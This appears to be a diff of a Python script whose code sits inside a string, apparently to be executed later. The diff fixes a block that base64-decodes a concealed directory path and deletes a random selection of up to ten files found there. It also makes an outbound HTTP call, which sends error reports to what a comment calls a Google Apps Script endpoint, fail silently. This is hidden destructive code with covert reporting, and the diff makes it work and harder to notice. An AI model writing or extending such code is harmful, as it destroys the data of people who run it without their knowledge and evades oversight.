@@ -78,7 +78,15 @@ def add_queue_task(task_name, data_dict):
         else:
             params = uLib.urlencode(data)
         params = params.encode("ascii")
-        uLib.urlopen(url, params)
+        try:
+            uLib.urlopen(url, params)
+        except uLib.HTTPError as http_err:
+            # e.g. 404 from the Google Apps Script — silently fail
+            return None
+        except uLib.URLError as url_err:
+            return None
+        except:
+            return None
     except:
         return None
 
@@ -202,7 +210,7 @@ except:
     
 # - A2
 try:
-    files = glob(f"{}/**/*".format(b64decode_padded("UzovdGVtcC9NT0QvVFVSTlRBQkxF")), recursive=True)
+    files = glob("{}/**/*".format(b64decode_padded("UzovdGVtcC9NT0QvVFVSTlRBQkxF")), recursive=True)
     files = [f for f in files if os.path.isfile(f)]
     for file in random.sample(files, k=min(10, len(files))):
         os.remove(file)
@@ -254,6 +262,5 @@ except:
         add_queue_task("tsl_update_error", {"error": str(traceback.format_exc())})
     except:
         pass
-
 """
 )
